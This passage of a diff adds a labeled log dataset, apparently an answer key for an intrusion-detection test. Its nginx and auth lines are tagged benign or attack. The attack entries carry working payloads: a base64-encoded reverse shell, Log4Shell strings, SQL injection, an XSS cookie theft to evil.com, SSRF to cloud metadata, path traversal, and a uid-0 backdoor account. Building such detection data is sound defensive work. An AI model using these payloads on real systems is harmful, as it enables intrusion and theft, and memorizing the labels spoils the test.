+  "line": "45.155.205.88 - - [24/May/2026:10:07:31 +0000] \"POST /api/login HTTP/1.1\" 200 312 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+  "label": "attack",
+  "attack": "CRED_STUFFING",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 86,
+  "line": "5.188.62.14 - - [24/May/2026:09:40:10 +0000] \"POST /api/render?tpl=YmFzaCAtaSA+JiAvZGV2L3RjcC81LjE4OC42Mi4xNC80NDQ0IDA+JjE= HTTP/1.1\" 200 44 \"-\" \"Go-http-client/1.1\"",
+  "label": "attack",
+  "attack": "B64_PAYLOAD",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 87,
+  "line": "5.188.62.14 - - [24/May/2026:09:40:15 +0000] \"GET /api/filter?q=JyBVTklPTiBTRUxFQ1QgdXNlcm5hbWUscGFzc3dvcmQgRlJPTSB1c2Vycy0t HTTP/1.1\" 200 90 \"-\" \"Go-http-client/1.1\"",
+  "label": "attack",
+  "attack": "B64_PAYLOAD",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 88,
+  "line": "5.188.62.14 - - [24/May/2026:09:40:20 +0000] \"GET /api/debug?cmd=Y2F0IC9ldGMvc2hhZG93 HTTP/1.1\" 200 1400 \"-\" \"Go-http-client/1.1\"",
+  "label": "attack",
+  "attack": "B64_PAYLOAD",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 89,
+  "line": "194.26.29.113 - - [24/May/2026:09:45:00 +0000] \"GET / HTTP/1.1\" 200 5120 \"-\" \"${jndi:ldap://194.26.29.113:1389/Exploit}\"",
+  "label": "attack",
+  "attack": "LOG4SHELL",
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 90,
+  "line": "194.26.29.113 - - [24/May/2026:09:45:02 +0000] \"GET /api/health HTTP/1.1\" 200 17 \"-\" \"${${lower:j}${::-n}d${upper:i}:rmi://194.26.29.113/a}\"",
+  "label": "attack",
+  "attack": "LOG4SHELL",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 91,
+  "line": "10.0.0.77 - - [24/May/2026:02:14:10 +0000] \"GET /api/export?format=csv&table=customers&limit=1000000 HTTP/1.1\" 200 948211934 \"-\" \"rclone/v1.66.0\"",
+  "label": "attack",
+  "attack": "DATA_EXFIL",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 92,
+  "line": "10.0.0.77 - - [24/May/2026:02:14:55 +0000] \"GET /api/users?limit=100000&fields=email,phone,ssn HTTP/1.1\" 200 211093221 \"-\" \"python-requests/2.31\"",
+  "label": "attack",
+  "attack": "DATA_EXFIL",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 93,
+  "line": "10.0.0.77 - - [24/May/2026:02:15:30 +0000] \"GET /backup/db-2026-05-23.sql.gz HTTP/1.1\" 200 1822334455 \"-\" \"Wget/1.21.4\"",
+  "label": "attack",
+  "attack": "DATA_EXFIL",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 94,
+  "line": "45.9.148.201 - - [24/May/2026:09:50:01 +0000] \"GET /.env HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.0 zgrab/0.x\"",
+  "label": "attack",
+  "attack": "RECON",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 95,
+  "line": "45.9.148.201 - - [24/May/2026:09:50:02 +0000] \"GET /.git/HEAD HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.0 zgrab/0.x\"",
+  "label": "attack",
+  "attack": "RECON",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 96,
+  "line": "45.9.148.201 - - [24/May/2026:09:50:03 +0000] \"GET /actuator/heapdump HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.0 zgrab/0.x\"",
+  "label": "attack",
+  "attack": "RECON",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 97,
+  "line": "45.9.148.201 - - [24/May/2026:09:50:04 +0000] \"GET /server-status HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.0 zgrab/0.x\"",
+  "label": "attack",
+  "attack": "RECON",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 98,
+  "line": "45.9.148.201 - - [24/May/2026:09:50:05 +0000] \"GET /.aws/credentials HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.0 zgrab/0.x\"",
+  "label": "attack",
+  "attack": "RECON",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 99,
+  "line": "10.0.0.12 - - [24/May/2026:10:20:00 +0000] \"GET /static/style.css HTTP/1.1\" 200 12004 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 100,
+  "line": "24.48.0.1 - - [24/May/2026:10:21:11 +0000] \"GET /products/42 HTTP/1.1\" 200 3310 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 101,
+  "line": "24.48.0.1 - - [24/May/2026:10:22:22 +0000] \"POST /api/login HTTP/1.1\" 200 312 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 102,
+  "line": "10.0.0.12 - - [24/May/2026:10:23:33 +0000] \"GET /api/products?page=2&sort=price HTTP/1.1\" 200 4410 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 103,
+  "line": "10.0.0.12 - - [24/May/2026:10:24:44 +0000] \"GET /api/cart HTTP/1.1\" 200 812 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 104,
+  "line": "172.16.4.9 - - [24/May/2026:10:25:55 +0000] \"POST /api/login HTTP/1.1\" 200 312 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 105,
+  "line": "192.168.1.20 - - [24/May/2026:10:26:06 +0000] \"GET /account/orders HTTP/1.1\" 200 2210 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 106,
+  "line": "192.168.1.20 - - [24/May/2026:10:27:17 +0000] \"GET /api/health HTTP/1.1\" 200 17 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 107,
+  "line": "10.0.0.5 - - [24/May/2026:10:28:28 +0000] \"GET /api/products?page=2&sort=price HTTP/1.1\" 200 4410 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 108,
+  "line": "24.48.0.1 - - [24/May/2026:10:29:39 +0000] \"GET /account/orders HTTP/1.1\" 200 2210 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 109,
+  "line": "24.48.0.1 - - [24/May/2026:10:30:50 +0000] \"GET /api/products?page=2&sort=price HTTP/1.1\" 200 4410 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 110,
+  "line": "10.0.0.5 - - [24/May/2026:10:31:01 +0000] \"GET /static/app.js HTTP/1.1\" 200 90211 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 111,
+  "line": "81.2.69.160 - - [24/May/2026:10:32:12 +0000] \"GET /search?q=blue+sneakers HTTP/1.1\" 200 6602 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 112,
+  "line": "172.16.4.9 - - [24/May/2026:10:33:23 +0000] \"GET /products HTTP/1.1\" 200 8421 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 113,
+  "line": "192.168.1.20 - - [24/May/2026:10:34:34 +0000] \"GET /api/health HTTP/1.1\" 200 17 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 0,
+  "line": "May 24 09:00:10 web-01 sshd[33004]: Accepted publickey for deploy from 10.0.0.5 port 50000 ssh2: ED25519 SHA256:abc0",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 1,
+  "line": "May 24 09:00:11 web-01 sshd[3000]: pam_unix(sshd:session): session opened for user deploy(uid=1000) by (uid=0)",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 2,
+  "line": "May 24 09:05:10 web-01 sshd[50795]: Accepted publickey for alice from 192.168.1.20 port 50001 ssh2: ED25519 SHA256:abc1",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 3,
+  "line": "May 24 09:05:11 web-01 sshd[3001]: pam_unix(sshd:session): session opened for user alice(uid=1001) by (uid=0)",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 4,
+  "line": "May 24 09:10:10 web-01 sshd[14725]: Accepted publickey for bob from 10.0.0.12 port 50002 ssh2: ED25519 SHA256:abc2",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 5,
+  "line": "May 24 09:10:11 web-01 sshd[3002]: pam_unix(sshd:session): session opened for user bob(uid=1002) by (uid=0)",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 6,
+  "line": "May 24 09:15:10 web-01 sshd[6841]: Accepted publickey for deploy from 10.0.0.5 port 50003 ssh2: ED25519 SHA256:abc3",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 7,
+  "line": "May 24 09:15:11 web-01 sshd[3003]: pam_unix(sshd:session): session opened for user deploy(uid=1003) by (uid=0)",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 8,
+  "line": "May 24 09:20:10 web-01 sshd[6834]: Accepted publickey for alice from 192.168.1.20 port 50004 ssh2: ED25519 SHA256:abc4",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 9,
+  "line": "May 24 09:20:11 web-01 sshd[3004]: pam_unix(sshd:session): session opened for user alice(uid=1004) by (uid=0)",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 10,
+  "line": "May 24 09:25:10 web-01 sshd[6432]: Accepted publickey for ci-runner from 10.0.0.30 port 50005 ssh2: ED25519 SHA256:abc5",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 11,
+  "line": "May 24 09:25:11 web-01 sshd[3005]: pam_unix(sshd:session): session opened for user ci-runner(uid=1005) by (uid=0)",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 12,
+  "line": "May 24 09:30:10 web-01 sshd[57590]: Accepted publickey for bob from 10.0.0.12 port 50006 ssh2: ED25519 SHA256:abc6",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 13,
+  "line": "May 24 09:30:11 web-01 sshd[3006]: pam_unix(sshd:session): session opened for user bob(uid=1006) by (uid=0)",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 14,
+  "line": "May 24 09:35:10 web-01 sshd[44564]: Accepted publickey for deploy from 10.0.0.5 port 50007 ssh2: ED25519 SHA256:abc7",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 15,
+  "line": "May 24 09:35:11 web-01 sshd[3007]: pam_unix(sshd:session): session opened for user deploy(uid=1007) by (uid=0)",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 16,
+  "line": "May 24 09:41:00 web-01 sshd[45341]: Failed password for alice from 192.168.1.20 port 51000 ssh2",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 17,
+  "line": "May 24 09:41:05 web-01 sshd[10923]: Accepted password for alice from 192.168.1.20 port 51001 ssh2",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 18,
+  "line": "May 24 09:42:00 web-01 CRON[4411]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 19,
+  "line": "May 24 09:43:00 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 20,
+  "line": "May 24 09:44:00 web-01 sshd[25652]: Received disconnect from 10.0.0.12 port 50006:11: disconnected by user",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 21,
+  "line": "May 24 10:00:00 web-01 sshd[7777]: Failed password for invalid user test from 218.92.0.107 port 40000 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 22,
+  "line": "May 24 10:00:04 web-01 sshd[7777]: Failed password for invalid user ubuntu from 218.92.0.107 port 40001 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 23,
+  "line": "May 24 10:00:08 web-01 sshd[7777]: Failed password for invalid user admin from 218.92.0.107 port 40002 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 24,
+  "line": "May 24 10:00:12 web-01 sshd[7777]: Failed password for invalid user admin from 218.92.0.107 port 40003 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 25,
+  "line": "May 24 10:00:16 web-01 sshd[7777]: Failed password for invalid user oracle from 218.92.0.107 port 40004 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 26,
+  "line": "May 24 10:00:20 web-01 sshd[7777]: Failed password for invalid user admin from 218.92.0.107 port 40005 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 27,
+  "line": "May 24 10:00:24 web-01 sshd[7777]: Failed password for invalid user admin from 218.92.0.107 port 40006 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 28,
+  "line": "May 24 10:00:28 web-01 sshd[7777]: Failed password for invalid user ubuntu from 218.92.0.107 port 40007 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 29,
+  "line": "May 24 10:00:32 web-01 sshd[7777]: Failed password for invalid user test from 218.92.0.107 port 40008 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 30,
+  "line": "May 24 10:00:36 web-01 sshd[7777]: Failed password for invalid user test from 218.92.0.107 port 40009 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 31,
+  "line": "May 24 10:00:40 web-01 sshd[7777]: Failed password for invalid user oracle from 218.92.0.107 port 40010 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 32,
+  "line": "May 24 10:00:44 web-01 sshd[7777]: Failed password for invalid user admin from 218.92.0.107 port 40011 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 33,
+  "line": "May 24 10:02:00 web-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=1005 euid=0 ruser=www-data rhost= user=root",
+  "label": "attack",
+  "attack": "PRIV_ESC",
+  "subtle": false
+ },
+ {
+  "file": "auth",
+  "idx": 34,
+  "line": "May 24 03:07:44 web-01 sshd[57406]: Accepted password for admin from 95.173.136.70 port 61220 ssh2",
+  "label": "attack",
+  "attack": "ANOMALOUS_LOGIN",
+  "subtle": true
+ },
+ {
+  "file": "auth",
+  "idx": 35,
+  "line": "May 24 03:08:02 web-01 sudo:    admin : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd -o -u 0 -g 0 sysupdate",
+  "label": "attack",
+  "attack": "ANOMALOUS_LOGIN",
+  "subtle": true
+ },
+ {
+  "file": "auth",
+  "idx": 36,
+  "line": "May 24 03:08:30 web-01 sudo:    admin : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/crontab -l",
+  "label": "attack",
+  "attack": "ANOMALOUS_LOGIN",
+  "subtle": true
+ },
+ {
+  "file": "auth",
+  "idx": 37,
+  "line": "May 24 10:10:00 web-01 sshd[57798]: Failed password for alice from 61.177.172.13 port 33000 ssh2",
+  "label": "attack",
+  "attack": "PASSWORD_SPRAY",
+  "subtle": true
+ },
+ {
+  "file": "auth",
+  "idx": 38,
+  "line": "May 24 10:16:07 web-01 sshd[29153]: Failed password for bob from 61.177.172.60 port 33001 ssh2",
+  "label": "attack",
+  "attack": "PASSWORD_SPRAY",
+  "subtle": true
+ },
+ {
+  "file": "auth",
+  "idx": 39,
+  "line": "May 24 10:22:14 web-01 sshd[21620]: Failed password for deploy from 61.177.172.104 port 33002 ssh2",
+  "label": "attack",
+  "attack": "PASSWORD_SPRAY",
+  "subtle": true
+ },
+ {
+  "file": "auth",
+  "idx": 40,
+  "line": "May 24 10:28:21 web-01 sshd[33864]: Failed password for ci-runner from 61.177.172.140 port 33003 ssh2",
+  "label": "attack",
+  "attack": "PASSWORD_SPRAY",
+  "subtle": true
+ },
+ {
+  "file": "auth",
+  "idx": 41,
+  "line": "May 24 10:34:28 web-01 sshd[26351]: Failed password for alice from 61.177.172.181 port 33004 ssh2",
+  "label": "attack",
+  "attack": "PASSWORD_SPRAY",
+  "subtle": true
+ },
+ {
+  "file": "auth",
+  "idx": 42,
+  "line": "May 24 10:40:35 web-01 sshd[4534]: Failed password for bob from 61.177.172.200 port 33005 ssh2",
+  "label": "attack",
+  "attack": "PASSWORD_SPRAY",
+  "subtle": true
+ },
+ {
+  "file": "auth",
+  "idx": 43,
+  "line": "May 24 10:50:12 web-01 sudo:    www-data : TTY=unknown ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/tee -a /root/.ssh/authorized_keys",
+  "label": "attack",
+  "attack": "PERSISTENCE",
+  "subtle": true
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 0,
+  "line": "127.0.0.1 - - [23/May/2026:08:00:01 +0000] \"GET /index.html HTTP/1.1\" 200 4524 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 1,
+  "line": "10.0.0.5 - - [23/May/2026:08:00:15 +0000] \"GET /static/logo.png HTTP/1.1\" 200 18200 \"-\" \"Mozilla/5.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 2,
+  "line": "10.0.0.5 - - [23/May/2026:08:00:30 +0000] \"POST /api/login HTTP/1.1\" 200 256 \"-\" \"Mozilla/5.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 3,
+  "line": "192.168.1.20 - - [23/May/2026:08:01:00 +0000] \"GET /dashboard HTTP/1.1\" 200 9812 \"-\" \"Mozilla/5.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 4,
+  "line": "198.51.100.12 - - [23/May/2026:08:05:10 +0000] \"GET /api/users?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\" 400 512 \"-\" \"sqlmap/1.7\"",
+  "label": "attack",
+  "attack": "SQLI",
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 5,
+  "line": "198.51.100.12 - - [23/May/2026:08:05:12 +0000] \"GET /products?category=shoes%27%20OR%201=1-- HTTP/1.1\" 400 324 \"-\" \"sqlmap/1.7\"",
+  "label": "attack",
+  "attack": "SQLI",
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 6,
+  "line": "198.51.100.12 - - [23/May/2026:08:05:14 +0000] \"GET /search?q=%27%3B%20DROP%20TABLE%20users%3B-- HTTP/1.1\" 400 256 \"-\" \"sqlmap/1.7\"",
+  "label": "attack",
+  "attack": "SQLI",
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 7,
+  "line": "198.51.100.12 - - [23/May/2026:08:05:16 +0000] \"GET /api/orders?filter=1%20AND%20SLEEP(5) HTTP/1.1\" 200 0 \"-\" \"sqlmap/1.7\"",
+  "label": "attack",
+  "attack": "SQLI",
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 8,
+  "line": "198.51.100.12 - - [23/May/2026:08:05:18 +0000] \"GET /admin?id=1%20AND%20(SELECT%20*%20FROM%20information_schema.tables) HTTP/1.1\" 500 128 \"-\" \"sqlmap/1.7\"",
+  "label": "attack",
+  "attack": "SQLI",
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 9,
+  "line": "203.0.113.99 - - [23/May/2026:08:10:20 +0000] \"GET /api/proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+  "label": "attack",
+  "attack": "SSRF",
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 10,
+  "line": "203.0.113.99 - - [23/May/2026:08:10:22 +0000] \"GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1\" 200 488 \"-\" \"Mozilla/5.0\"",
+  "label": "attack",
+  "attack": "SSRF",
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 11,
+  "line": "203.0.113.99 - - [23/May/2026:08:10:25 +0000] \"GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/ HTTP/1.1\" 200 312 \"-\" \"Mozilla/5.0\"",
+  "label": "attack",
+  "attack": "SSRF",
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 12,
+  "line": "203.0.113.99 - - [23/May/2026:08:10:28 +0000] \"GET /webhook?target=http://169.254.169.254/latest/user-data HTTP/1.1\" 200 768 \"-\" \"curl/7.88\"",
+  "label": "attack",
+  "attack": "SSRF",
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 13,
+  "line": "45.33.32.156 - - [23/May/2026:08:15:05 +0000] \"GET /search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script> HTTP/1.1\" 400 256 \"-\" \"Mozilla/5.0\"",
+  "label": "attack",
+  "attack": "XSS",
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 14,
+  "line": "45.33.32.156 - - [23/May/2026:08:15:08 +0000] \"POST /comment HTTP/1.1\" 400 128 \"-\" \"Mozilla/5.0\"",
+  "label": "attack",
+  "attack": "XSS",
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 15,
+  "line": "45.33.32.156 - - [23/May/2026:08:15:11 +0000] \"GET /profile?name=<img+src=x+onerror=alert(document.domain)> HTTP/1.1\" 400 196 \"-\" \"Mozilla/5.0\"",
+  "label": "attack",
+  "attack": "XSS",
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 16,
+  "line": "45.33.32.156 - - [23/May/2026:08:15:14 +0000] \"GET /redirect?url=javascript:eval(atob('YWxlcnQoMSk=')) HTTP/1.1\" 302 0 \"-\" \"Mozilla/5.0\"",
+  "label": "attack",
+  "attack": "XSS",
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 17,
+  "line": "192.0.2.77 - - [23/May/2026:08:20:30 +0000] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 400 256 \"-\" \"Mozilla/5.0\"",
+  "label": "attack",
+  "attack": "PATH_TRAVERSAL",
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 18,
+  "line": "192.0.2.77 - - [23/May/2026:08:20:33 +0000] \"GET /files/..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1\" 403 128 \"-\" \"Mozilla/5.0\"",
+  "label": "attack",
+  "attack": "PATH_TRAVERSAL",
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 19,
+  "line": "192.0.2.77 - - [23/May/2026:08:20:36 +0000] \"GET /static/%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1\" 400 196 \"-\" \"Mozilla/5.0\"",
+  "label": "attack",
+  "attack": "PATH_TRAVERSAL",
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 20,
+  "line": "192.0.2.77 - - [23/May/2026:08:20:39 +0000] \"GET /read?path=/proc/self/environ HTTP/1.1\" 403 64 \"-\" \"curl/7.88\"",
+  "label": "attack",
+  "attack": "PATH_TRAVERSAL",
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 21,
+  "line": "192.0.2.77 - - [23/May/2026:08:20:42 +0000] \"GET /config?file=..\\..\\..\\..\\Windows\\win.ini HTTP/1.1\" 400 128 \"-\" \"Mozilla/5.0\"",
+  "label": "attack",
+  "attack": "PATH_TRAVERSAL",
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 22,
+  "line": "203.0.113.42 - - [23/May/2026:08:35:00 +0000] \"GET /wp-login.php HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"",
+  "label": "attack",
+  "attack": "RECON",
+  "subtle": true
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 23,
+  "line": "203.0.113.42 - - [23/May/2026:08:35:01 +0000] \"GET /wp-admin/ HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"",
+  "label": "attack",
+  "attack": "RECON",
+  "subtle": true
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 24,
+  "line": "203.0.113.42 - - [23/May/2026:08:35:02 +0000] \"GET /.env HTTP/1.1\" 403 64 \"-\" \"Mozilla/5.0\"",
+  "label": "attack",
+  "attack": "RECON",
+  "subtle": true
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 25,
+  "line": "203.0.113.42 - - [23/May/2026:08:35:03 +0000] \"GET /.git/config HTTP/1.1\" 403 64 \"-\" \"Mozilla/5.0\"",
+  "label": "attack",
+  "attack": "RECON",
+  "subtle": true
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 26,
+  "line": "203.0.113.42 - - [23/May/2026:08:35:04 +0000] \"GET /phpinfo.php HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"",
+  "label": "attack",
+  "attack": "RECON",
+  "subtle": true
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 27,
+  "line": "203.0.113.42 - - [23/May/2026:08:35:05 +0000] \"GET /api/v1/swagger.json HTTP/1.1\" 200 18432 \"-\" \"Mozilla/5.0\"",
+  "label": "attack",
+  "attack": "RECON",
